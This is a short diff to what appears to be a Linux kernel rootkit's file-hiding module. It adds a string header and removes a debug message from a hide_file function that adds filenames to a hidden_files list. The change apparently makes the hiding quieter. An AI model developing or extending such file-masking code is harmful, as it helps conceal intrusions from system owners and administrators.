@@ -5,6 +5,7 @@
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/slab.h>
+#include <linux/string.h>
 
 #include "file_masking.h"
 #include "core.h"
@@ -130,8 +131,6 @@ int hide_file(char *name)
 
 	new->file = name;
 	list_add(&new->list, &hidden_files);
-
-	PRINT("Hiding new file\n");
 
 	return 0;
 }
